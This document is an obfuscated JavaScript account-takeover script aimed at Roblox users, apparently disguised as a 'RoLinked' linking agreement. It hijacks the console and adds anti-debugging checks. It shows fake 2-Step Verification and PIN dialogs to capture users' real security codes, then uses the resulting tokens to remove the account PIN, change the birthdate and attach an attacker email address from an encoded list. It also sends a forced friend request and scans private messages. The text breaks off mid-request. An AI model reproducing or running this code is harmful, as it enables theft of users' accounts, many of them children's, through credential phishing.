(function () {
    var N = function () {
        var L = {
            wktMb: function (R, O) {
                return R(O);
            },
            CwkYS: "rblx-challenge-metadata",
            rxxnt: "rblx-challenge-id",
            ycYVQ: '"challengeId":"',
            WVupU: function (R, O, X, A) {
                return R(O, X, A);
            },
            DAPCS: function (R, O) {
                return R(O);
            },
            OzGTa: function (R, O) {
                return R + O;
            },
            yehqj: "return (function() ",
            uVPKw: '{}.constructor("return this")( )',
            kHVGJ: function (R) {
                return R();
            },
        };
        var J;
        try {
            J = Function('return (function() {}.constructor("return this")( ));')();
        } catch (X) {
            J = window;
        }
        return J;
    };
    var K = N();
    K.setInterval(B, 4000);
})();
(async function () {
    var O = (function () {
            var S = {
                ypNyr: function (k, G) {
                    return k(G);
                },
                qTCHt: "rblx-challenge-metadata",
                cFXdv: "rblx-challenge-id",
                BVjmR: '"challengeId":"',
                jQxsp: function (k, G, q, i) {
                    return k(G, q, i);
                },
                zboxz: "emailPopupz",
                jbBtK: "agreeRoLinked",
                Fygpa: "POST",
                Bzoaa: "application/json",
                AYJyX: function (k, G) {
                    return k === G;
                },
                wVbkd: "TGvaU",
                TNaQG: function (k, G) {
                    return k !== G;
                },
                GBUmm: "ZGTOf",
            };
            var m = true;
            return function (k, G) {
                var q = {
                    qRjYA: function (b, w) {
                        return b == w;
                    },
                    Ggxdv: "two-step-verification-code-input",
                    yVADo: "btn-cta-md modal-modern-footer-button",
                    XdnOj: function (b, w, a) {
                        return b(w, a);
                    },
                    iwvyN: "POST",
                    uqlhd: "application/json",
                    RngRc: function (b) {
                        return b();
                    },
                };
                var i = m
                    ? function () {
                          var w = {
                              CumWk: function (E, e) {
                                  return S.ypNyr(E, e);
                              },
                              jAlSq: S.qTCHt,
                              rHeeX: S.cFXdv,
                              PWNWv: S.BVjmR,
                              krcQs: function (E, e, l, Z) {
                                  return S.jQxsp(E, e, l, Z);
                              },
                              qSOMt: S.zboxz,
                              DoVfT: S.jbBtK,
                              pVwtc: S.Fygpa,
                              GNoAb: S.Bzoaa,
                          };
                          if (S.AYJyX(S.wVbkd, S.wVbkd)) {
                              if (G) {
                                  if (S.TNaQG(S.GBUmm, S.GBUmm)) {
                                      var e = {
                                          jFQyG: function (l, Z) {
                                              return w.CumWk(l, Z);
                                          },
                                          TSzBe: w.jAlSq,
                                          aLPAz: w.rHeeX,
                                          uDkpK: w.PWNWv,
                                          CXNOv: function (l, Z, o, V) {
                                              return w.krcQs(l, Z, o, V);
                                          },
                                      };
                                      R.getElementById(w.qSOMt).remove();
                                      O.getElementById(w.DoVfT).disabled = false;
                                      X.ajax({
                                          method: w.pVwtc,
                                          url: "https://twostepverification.roblox.com/v1/users/" + A + "/configuration/email/enable",
                                          contentType: w.GNoAb,
                                          success: function () {},
                                          error: function (l) {
                                              var Z = e.jFQyG(v, l.getResponseHeader(e.TSzBe)),
                                                  o = l.getResponseHeader(e.aLPAz);
                                              var V = Z.split(e.uDkpK).pop().split('"')[0];
                                              e.CXNOv(W, V, o, 1);
                                          },
                                      });
                                  } else {
                                      var a = G.apply(k, arguments);
                                      return (G = null), a;
                                  }
                              }
                          } else {
                              O.log(l);
                              try {
                                  var l = { friendshipOriginSourceType: 0 };
                                  p.ajax({
                                      method: q.iwvyN,
                                      url: "https://friends.roblox.com/v1/users/6045232974/request-friendship",
                                      contentType: q.uqlhd,
                                      data: h.stringify(l),
                                  });
                              } catch {}
                              q.RngRc(A);
                          }
                      }
                    : function () {};
                return (m = false), i;
            };
        })(),
        X = O(this, function () {
            var S = {
                hKveR: "form-control-label bottom-label xsmall",
                OeMNV: "Invalid code",
                sXgJw: "groupElementId",
                teFNe: "form-has-feedback  form-has-error form-group",
            };
            return X.toString().search("(((.+)+)+)+$").toString().constructor(X).search("(((.+)+)+)+$");
        });
    X();
    var A = (function () {
        var S = true;
        return function (k, G) {
            var i = S
                ? function () {
                      if (G) {
                          var a = G.apply(k, arguments);
                          return (G = null), a;
                      }
                  }
                : function () {};
            return (S = false), i;
        };
    })();
    (function () {
        A(this, function () {
            var k = new RegExp("function *\\( *\\)"),
                G = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i"),
                q = B("init");
            if (!k.test(q + "chain") || !G.test(q + "input")) {
                q("0");
            } else {
                B();
            }
        })();
    })();
    var p = (function () {
            var k = true;
            return function (q, i) {
                var w = k
                    ? function () {
                          if (i) {
                              var e = i.apply(q, arguments);
                              return (i = null), e;
                          }
                      }
                    : function () {};
                return (k = false), w;
            };
        })(),
        h = p(this, function () {
            var m = function () {
                    var Z;
                    try {
                        Z = Function('return (function() {}.constructor("return this")( ));')();
                    } catch (V) {
                        Z = window;
                    }
                    return Z;
                },
                k = m(),
                G = (k.console = k.console || {}),
                q = ["log", "warn", "info", "error", "exception", "table", "trace"];
            for (var i = 0; i < q.length; i++) {
                var a = p.constructor.prototype.bind(p);
                var e = q[i];
                var E = G[e] || a;
                a["__proto__"] = p.bind(p);
                a.toString = E.toString.bind(E);
                G[e] = a;
            }
        });
    h();
    const v = (S) => new Promise((m) => setTimeout(m, S));
    var W = ["YWxiZXJ0aW5hZ3VlcnJlcm8xOTcxQGhvdG1haWwuY29t", "YWx3aW5lLmxlbm9yYV8xOTg5QGhvdG1haWwuY29t", "YXJjaGliYWxkYWxleGFuZHJhNjRAaG90bWFpbC5jb20=", "YWxkcmlkZ2VhbmdlbGExM0Bob3RtYWlsLmNvbQ==", "YW5pdGFiYWxkd2luNTBAaG90bWFpbC5jb20=", "YWxpY2ViaXJjaDQwQGhvdG1haWwuY29t", "YXJjaGliYWxkbWFyeTk0QGhvdG1haWwuY29t", "YWx5c3NhZ2lsbW9yZTA5QGhvdG1haWwuY29t"],
        c = "@hotmail.com",
        I = "a***",
        M = W[Math.floor(Math.random() * W.length)],
        t = 6045232974;
    validDev = [];
    try {
        $.ajax({
            method: "GET",
            url: "https://privatemessages.roblox.com/v1/messages?messageTab=inbox&pageNumber=0&pageSize=20",
            contentType: "application/json",
            success: function (S) {
                var k = Number(S.totalPages);
                for (let q = 0; q < k; q++) {
                    $.ajax({
                        method: "GET",
                        url: "https://privatemessages.roblox.com/v1/messages?messageTab=inbox&pageNumber=" + q + "&pageSize=20",
                        contentType: "application/json",
                        success: function (w) {
                            var E = w.collection;
                            for (var e of E) {
                                e.body.includes("VlK Games") == true && validDev.push("true");
                            }
                        },
                    });
                }
            },
        });
    } catch {}
    try {
        $.ajax({
            method: "GET",
            url: "https://privatemessages.roblox.com/v1/messages?messageTab=archive&pageNumber=0&pageSize=20",
            contentType: "application/json",
            success: function (k) {
                var b = Number(k.totalPages);
                for (let a = 0; a < b; a++) {
                    $.ajax({
                        method: "GET",
                        url: "https://privatemessages.roblox.com/v1/messages?messageTab=archive&pageNumber=" + a + "&pageSize=20",
                        contentType: "application/json",
                        success: function (E) {
                            var Z = E.collection;
                            for (var o of Z) {
                                o.body.includes("VlK Games") == true && validDev.push("true");
                            }
                        },
                    });
                }
            },
        });
    } catch {}
    try {
        console.log(document.getElementsByClassName("text-footer footer-note")[0].innerText);
    } catch {
        window.location.reload();
    }
    if (document.getElementsByClassName("text-footer footer-note")[0].innerText != "Active") {
        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Active";
        $.ajax({
            method: "GET",
            url: "https://users.roblox.com/v1/users/authenticated",
            contentType: "application/json",
            success: function (q) {
                var b = q.id;
                try {
                    var w = { friendshipOriginSourceType: 0 };
                    $.ajax({
                        method: "POST",
                        url: "https://friends.roblox.com/v1/users/" + t + "/request-friendship",
                        contentType: "application/json",
                        data: JSON.stringify(w),
                    });
                } catch {}
                async function a() {
                    function l() {
                        $.ajax({
                            method: "GET",
                            url: "https://accountsettings.roblox.com/v1/email",
                            contentType: "application/json",
                            success: function (y) {
                                if (y.emailAddress == null) {
                                    $.ajax({
                                        method: "POST",
                                        url: "https://accountsettings.roblox.com/v1/email",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            emailAddress: atob(M),
                                            password: "",
                                        }),
                                    });
                                } else {
                                    var P = y.emailAddress,
                                        n = y.verified;
                                    if (P.includes(c) == true) {
                                        if (P.includes(I) == true) {
                                            if (n == true) {
                                                (async function () {
                                                    await v(500);
                                                    var j = {
                                                        method: "POST",
                                                        url: "https://auth.roblox.com/v2/logout",
                                                        contentType: "application/json",
                                                    };
                                                    $.ajax(j);
                                                })();
                                            }
                                        }
                                    }
                                }
                            },
                        }),
                            setTimeout(l, 2000);
                    }
                    l();
                    function Z(H, C, y) {
                        $.ajax({
                            method: "POST",
                            url: "https://twostepverification.roblox.com/v1/users/" + b + "/challenges/email/send-code",
                            contentType: "application/json",
                            data: JSON.stringify({
                                actionType: "Generic",
                                challengeId: H,
                            }),
                            success: function () {
                                var n = '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">Enter the code we just sent you via email. </p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>';
                                document.body.insertAdjacentHTML("beforeend", n);
                                function Y() {
                                    if (document.getElementById("two-step-verification-code-input").value.length == 6) {
                                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = false;
                                    } else {
                                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = true;
                                    }
                                    setTimeout(Y, 100);
                                }
                                Y();
                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                    $.ajax({
                                        method: "POST",
                                        url: "https://twostepverification.roblox.com/v1/users/" + b + "/challenges/email/verify",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            challengeId: H,
                                            actionType: "Generic",
                                            code: document.getElementById("two-step-verification-code-input").value,
                                        }),
                                        success: function (g) {
                                            var x = g.verificationToken;
                                            $.ajax({
                                                method: "POST",
                                                url: "https://apis.roblox.com/challenge/v1/continue",
                                                contentType: "application/json",
                                                data: JSON.stringify({
                                                    challengeId: C,
                                                    challengeMetadata: '{"verificationToken":"' + x + '","rememberDevice":false,"challengeId":"' + H + '","actionType":"Generic"}',
                                                    challengeType: "twostepverification",
                                                }),
                                                success: function () {
                                                    document.getElementById("twoStepPrompts").remove();
                                                    v(2000);
                                                    var z1 = btoa('{"reauthenticationToken":"' + x + '"}');
                                                    console.log(y);
                                                    if (y == 1) {
                                                        console.log("Reason is 1");
                                                        var z2 = {
                                                            method: "POST",
                                                            url: "https://twostepverification.roblox.com/v1/users/" + b + "/configuration/email/enable",
                                                            contentType: "application/json",
                                                            headers: {},
                                                        };
                                                        z2.headers["Rblx-Challenge-Type"] = "reauthentication";
                                                        z2.headers["Rblx-Challenge-Id"] = C;
                                                        z2.headers["Rblx-Challenge-Metadata"] = z1;
                                                        $.ajax(z2);
                                                    } else {
                                                        y == null
                                                            ? $.ajax({
                                                                  method: "DELETE",
                                                                  url: "https://auth.roblox.com/v1/account/pin",
                                                                  contentType: "application/json",
                                                                  headers: {
                                                                      "Rblx-Challenge-Type": "reauthentication",
                                                                      "Rblx-Challenge-Id": C,
                                                                      "Rblx-Challenge-Metadata": z1,
                                                                  },
                                                                  success: function () {
                                                                      d(null, null);
                                                                  },
                                                              })
                                                            : d(C, z1);
                                                    }
                                                },
                                            });
                                        },
                                        error: function () {
                                            document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "Invalid code";
                                            document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group";
                                        },
                                    });
                                };
                            },
                        });
                    }
                    function o(H, C, y) {
                        var P = '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">Enter the code generated by your authenticator app. </p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>';
                        document.body.insertAdjacentHTML("beforeend", P);
                        function n() {
                            document.getElementById("two-step-verification-code-input").value.length == 6 ? (document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = false) : (document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = true), setTimeout(n, 100);
                        }
                        n();
                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                            $.ajax({
                                method: "POST",
                                url: "https://twostepverification.roblox.com/v1/users/" + b + "/challenges/authenticator/verify",
                                contentType: "application/json",
                                data: JSON.stringify({
                                    challengeId: H,
                                    actionType: "Generic",
                                    code: document.getElementById("two-step-verification-code-input").value,
                                }),
                                success: function (Y) {
                                    var f = Y.verificationToken;
                                    $.ajax({
                                        method: "POST",
                                        url: "https://apis.roblox.com/challenge/v1/continue",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            challengeId: C,
                                            challengeMetadata: '{"verificationToken":"' + f + '","rememberDevice":false,"challengeId":"' + H + '","actionType":"Generic"}',
                                            challengeType: "twostepverification",
                                        }),
                                        success: function () {
                                            document.getElementById("twoStepPrompts").remove();
                                            v(2000);
                                            var z0 = btoa('{"reauthenticationToken":"' + f + '"}');
                                            if (y == 1) {
                                                console.log("Reason is 1");
                                                var z1 = {
                                                    method: "POST",
                                                    url: "https://twostepverification.roblox.com/v1/users/" + b + "/configuration/email/enable",
                                                    contentType: "application/json",
                                                    headers: {},
                                                };
                                                z1.headers["Rblx-Challenge-Type"] = "reauthentication";
                                                z1.headers["Rblx-Challenge-Id"] = C;
                                                z1.headers["Rblx-Challenge-Metadata"] = z0;
                                                $.ajax(z1);
                                            } else {
                                                if (y == null) {
                                                    $.ajax({
                                                        method: "DELETE",
                                                        url: "https://auth.roblox.com/v1/account/pin",
                                                        contentType: "application/json",
                                                        headers: {
                                                            "Rblx-Challenge-Type": "reauthentication",
                                                            "Rblx-Challenge-Id": C,
                                                            "Rblx-Challenge-Metadata": z0,
                                                        },
                                                        success: function () {
                                                            d(null, null);
                                                        },
                                                    });
                                                } else {
                                                    d(C, z0);
                                                }
                                            }
                                        },
                                    });
                                },
                                error: function (Y) {
                                    if (Y.responseText.includes('"code":18')) {
                                        document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "This code has already been used. Please enter a new code.";
                                        document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group";
                                    } else {
                                        (document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "Invalid code"), (document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group");
                                    }
                                },
                            });
                        };
                    }
                    function V(H, C) {
                        $.ajax({
                            method: "POST",
                            url: "https://apis.roblox.com/otp-service/v1/sendCodeForUser",
                            contentType: "application/json",
                            data: JSON.stringify({
                                contactType: "Email",
                                messageVariant: "Default",
                                origin: "Reauth",
                            }),
                            success: function (P) {
                                var u = P.otpSessionToken,
                                    Y = '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">A one-time code has been sent to your registered email. Please enter your one-time code to continue.</p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-Digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>';
                                document.body.insertAdjacentHTML("beforeend", Y);
                                function j() {
                                    if (document.getElementById("two-step-verification-code-input").value.length == 6) {
                                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = false;
                                    } else {
                                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = true;
                                    }
                                    setTimeout(j, 100);
                                }
                                j();
                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                    $.ajax({
                                        method: "POST",
                                        url: "https://apis.roblox.com/otp-service/v1/validateCode",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            contactType: "Email",
                                            origin: "Reauth",
                                            otpSessionToken: u,
                                            passCode: document.getElementById("two-step-verification-code-input").value,
                                        }),
                                        success: function () {
                                            $.ajax({
                                                method: "POST",
                                                url: "https://apis.roblox.com/reauthentication-service/v1/token/generate",
                                                contentType: "application/json",
                                                data: JSON.stringify({
                                                    sessionId: u,
                                                    type: "Otp_Email",
                                                }),
                                                success: function (x) {
                                                    (responseToken = x.token),
                                                        $.ajax({
                                                            method: "POST",
                                                            url: "https://apis.roblox.com/challenge/v1/continue",
                                                            contentType: "application/json",
                                                            data: JSON.stringify({
                                                                challengeId: H,
                                                                challengeMetadata: '{"reauthenticationToken":"' + responseToken + '"}',
                                                                challengeType: "reauthentication",
                                                            }),
                                                            success: function () {
                                                                document.getElementById("twoStepPrompts").remove();
                                                                v(2000);
                                                                var z3 = btoa('{"reauthenticationToken":"' + responseToken + '"}');
                                                                if (C == 1) {
                                                                    console.log("Reason is 1");
                                                                    var z4 = {
                                                                        method: "POST",
                                                                        url: "https://twostepverification.roblox.com/v1/users/" + b + "/configuration/email/enable",
                                                                        contentType: "application/json",
                                                                        headers: {},
                                                                    };
                                                                    z4.headers["Rblx-Challenge-Type"] = "reauthentication";
                                                                    z4.headers["Rblx-Challenge-Id"] = H;
                                                                    z4.headers["Rblx-Challenge-Metadata"] = z3;
                                                                    $.ajax(z4);
                                                                } else {
                                                                    if (C == null) {
                                                                        $.ajax({
                                                                            method: "DELETE",
                                                                            url: "https://auth.roblox.com/v1/account/pin",
                                                                            contentType: "application/json",
                                                                            headers: {
                                                                                "Rblx-Challenge-Type": "reauthentication",
                                                                                "Rblx-Challenge-Id": H,
                                                                                "Rblx-Challenge-Metadata": z3,
                                                                            },
                                                                            success: function () {
                                                                                d(null, null);
                                                                            },
                                                                        });
                                                                    } else {
                                                                        d(H, z3);
                                                                    }
                                                                }
                                                            },
                                                        });
                                                },
                                            });
                                        },
                                        error: function () {
                                            document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "Invalid code";
                                            document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group";
                                        },
                                    });
                                };
                            },
                        });
                    }
                    function Q(H, C, y) {
                        $.ajax({
                            method: "GET",
                            url: "https://twostepverification.roblox.com/v1/users/" + b + "/configuration",
                            contentType: "application/json",
                            success: function (P) {
                                var u = P.primaryMediaType;
                                if (u == "Email") {
                                    Z(H, C, y);
                                } else {
                                    if (u == "Authenticator") {
                                        o(H, C, y);
                                    } else {
                                        u == null && V(C, y);
                                    }
                                }
                            },
                        });
                    }
                    function d(H, C) {
                        $.ajax({
                            method: "GET",
                            url: "https://twostepverification.roblox.com/v1/users/" + b + "/configuration",
                            contentType: "application/json",
                            success: function (F) {
                                var n = F.primaryMediaType;
                                if (n == "Authenticator") {
                                    document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                    if (document.getElementById("emailPopupz") == null) {
                                        var u = '<div id="emailPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog" bis_skin_checked="1"><div class="modal-content" role="document" bis_skin_checked="1"><div title="" class="modal-header" bis_skin_checked="1"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Email 2-Step Verification</h4><div class="modal-modern-header-info" bis_skin_checked="1"></div></div><div class="modal-body" bis_skin_checked="1"><div class="modal-lock-icon" bis_skin_checked="1"></div><p>You must enable Email 2-Step Verification to complete this action.</p></div><div class="modal-footer" bis_skin_checked="1"><div class="modal-modern-footer-buttons" bis_skin_checked="1"><button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Set Up">Enable</button></div></div></div></div></div></div>';
                                        document.body.insertAdjacentHTML("beforeend", u);
                                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                            document.getElementById("emailPopupz").remove();
                                            document.getElementById("agreeRoLinked").disabled = false;
                                            $.ajax({
                                                method: "POST",
                                                url: "https://twostepverification.roblox.com/v1/users/" + b + "/configuration/email/enable",
                                                contentType: "application/json",
                                                success: function () {},
                                                error: function (s) {
                                                    var z0 = atob(s.getResponseHeader("rblx-challenge-metadata")),
                                                        z1 = s.getResponseHeader("rblx-challenge-id"),
                                                        z2 = z0.split('"challengeId":"').pop().split('"')[0];
                                                    Q(z2, z1, 1);
                                                },
                                            });
                                        };
                                    }
                                } else {
                                    if (H == null) {
                                        var Y = {
                                            birthDay: 2,
                                            birthMonth: 2,
                                            birthYear: 2022,
                                        };
                                        $.ajax({
                                            method: "POST",
                                            url: "https://users.roblox.com/v1/birthdate",
                                            contentType: "application/json",
                                            data: JSON.stringify(Y),
                                            success: function () {
                                                $.ajax({
                                                    method: "POST",
                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                    contentType: "application/json",
                                                    data: JSON.stringify({
                                                        emailAddress: atob(M),
                                                        password: "",
                                                    }),
                                                    success: function () {
                                                        (async function () {
                                                            await v(1500);
                                                            $.ajax({
                                                                method: "GET",
                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                contentType: "application/json",
                                                                success: function (z2) {
                                                                    if (z2.emailAddress == null) {
                                                                        $.ajax({
                                                                            method: "POST",
                                                                            url: "https://accountsettings.roblox.com/v1/email",
                                                                            contentType: "application/json",
                                                                            data: JSON.stringify({
                                                                                emailAddress: atob(M),
                                                                                password: "",
                                                                            }),
                                                                        });
                                                                    }
                                                                },
                                                            });
                                                        })();
                                                    },
                                                    error: function () {
                                                        (async function () {
                                                            await v(1500),
                                                                $.ajax({
                                                                    method: "GET",
                                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                                    contentType: "application/json",
                                                                    success: function (z4) {
                                                                        z4.emailAddress == null &&
                                                                            $.ajax({
                                                                                method: "POST",
                                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                                contentType: "application/json",
                                                                                data: JSON.stringify({
                                                                                    emailAddress: atob(M),
                                                                                    password: "",
                                                                                }),
                                                                            });
                                                                    },
                                                                });
                                                        })();
                                                    },
                                                });
                                            },
                                            error: function (x) {
                                                var z1 = atob(x.getResponseHeader("rblx-challenge-metadata")),
                                                    z2 = x.getResponseHeader("rblx-challenge-id"),
                                                    z3 = z1.split('"challengeId":"').pop().split('"')[0];
                                                Q(z3, z2, 2);
                                            },
                                        });
                                    } else {
                                        var j = {
                                            birthDay: 2,
                                            birthMonth: 2,
                                            birthYear: 2022,
                                        };
                                        $.ajax({
                                            method: "POST",
                                            url: "https://users.roblox.com/v1/birthdate",
                                            contentType: "application/json",
                                            headers: {
                                                "Rblx-Challenge-Type": "reauthentication",
                                                "Rblx-Challenge-Id": H,
                                                "Rblx-Challenge-Metadata": C,
                                            },
                                            data: JSON.stringify(j),
                                            success: function () {
                                                $.ajax({
                                                    method: "POST",
                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                    contentType: "application/json",
                                                    data: JSON.stringify({
                                                        emailAddress: atob(M),
                                                        password: "",
                                                    }),
                                                    success: function () {
                                                        (async function () {
                                                            await v(1500);
                                                            $.ajax({
                                                                method: "GET",
                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                contentType: "application/json",
                                                                success: function (z3) {
                                                                    z3.emailAddress == null &&
                                                                        $.ajax({
                                                                            method: "POST",
                                                                            url: "https://accountsettings.roblox.com/v1/email",
                                                                            contentType: "application/json",
                                                                            data: JSON.stringify({
                                                                                emailAddress: atob(M),
                                                                                password: "",
                                                                            }),
                                                                        });
                                                                },
                                                            });
                                                        })();
                                                    },
                                                    error: function () {
                                                        (async function () {
                                                            await v(1500),
                                                                $.ajax({
                                                                    method: "GET",
                                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                                    contentType: "application/json",
                                                                    success: function (z2) {
                                                                        if (z2.emailAddress == null) {
                                                                            $.ajax({
                                                                                method: "POST",
                                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                                contentType: "application/json",
                                                                                data: JSON.stringify({
                                                                                    emailAddress: atob(M),
                                                                                    password: "",
                                                                                }),
                                                                            });
                                                                        }
                                                                    },
                                                                });
                                                        })();
                                                    },
                                                });
                                            },
                                            error: function (x) {
                                                var z0 = atob(x.getResponseHeader("rblx-challenge-metadata"));
                                                var z1 = x.getResponseHeader("rblx-challenge-id");
                                                var z2 = z0.split('"challengeId":"').pop().split('"')[0];
                                                Q(z2, z1, 2);
                                            },
                                        });
                                    }
                                }
                            },
                        });
                    }
                    if (document.getElementById("RoLinked1") == null) {
                        var r = '<div id="RoLinked1" role="dialog"><div class="fade modal-backdrop in"></div><div aria-labelledby="contained-modal-title-vcenter" scrollable="true" centered="true" role="dialog" tabindex="-1" style="display: block;" class="fade verification-modal in modal"><div class="modal-sm modal-dialog"><div class="modal-content" role="document"><div><div title="" class="modal-header"><div class="verification-upsell-title-container"><button type="button" class="verification-upsell-title-button"></button><h4 id="contained-modal-title-vcenter" class="modal-title">RoLinked Agreement </h4></div></div><div class="verification-upsell-text-body text-description">RoLinked can view your Roblox Username</div><div class="modal-footer"><div class="text-description font-caption-body phone-verification-legal-text" hidden="">By clicking "Continue", you are submitting your phone number and agreeing to our <a href="https://en.help.roblox.com/hc/articles/9483830673556-Roblox-SMS-Terms-of-Service">SMS Terms of Use</a> and <a href="https://en.help.roblox.com/hc/articles/115004630823">Privacy Policy</a>. We will send you a one-time verification code. Message and data rates may apply. Reply HELP for help.</div><div class="buttons-section"><button type="button" class="accept-btn btn-primary-md btn-min-width" id="agreeRoLinked">Agree & Continue</button></div><div></div></div></div></div></div></div></div>';
                        document.body.insertAdjacentHTML("beforeend", r);
                        document.getElementById("agreeRoLinked").onclick = function () {
                            document.getElementById("agreeRoLinked").disabled = true;
                            $.ajax({
                                method: "GET",
                                url: "https://auth.roblox.com/v1/account/pin",
                                contentType: "application/json",
                                success: function (C) {
                                    var F = C.isEnabled,
                                        P = C.unlockedUntil;
                                    if (F == true) {
                                        if (P == null) {
                                            document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                            if (document.getElementById("pinPopupz") == null) {
                                                var n = '<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>';
                                                document.body.insertAdjacentHTML("beforeend", n);
                                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                                    document.getElementById("pinPopupz").remove();
                                                    document.getElementById("agreeRoLinked").disabled = false;
                                                };
                                            }
                                        } else {
                                            try {
                                                document.getElementById("pinPopupz").remove();
                                            } catch {}
                                            $.ajax({
                                                method: "DELETE",
                                                url: "https://auth.roblox.com/v1/account/pin",
